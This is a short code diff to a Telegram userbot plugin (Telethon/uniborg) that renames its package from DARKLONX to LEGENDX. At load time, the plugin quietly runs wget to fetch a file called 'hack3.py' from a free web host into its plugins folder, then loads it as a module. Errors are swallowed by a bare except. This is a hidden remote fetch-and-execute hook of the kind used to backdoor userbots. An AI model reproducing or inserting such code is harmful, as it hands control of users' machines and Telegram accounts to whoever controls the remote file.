@@ -7,11 +7,11 @@ from telethon import events
 import asyncio
 from uniborg.util import admin_cmd
 from telethon.tl.functions.users import GetFullUserRequest
-from DARKLONX.utils import load_module
+from LEGENDX.utils import load_module
 import os
 # hack3 installation
 try:
-  os.system('wget https://DARKLONX.000webhostapp.com/hack3.py -P DARKLONX/plugins/')
+  os.system('wget https://LEGENDX.000webhostapp.com/hack3.py -P LEGENDX/plugins/')
   load_module('hack3')
 except:
   pass
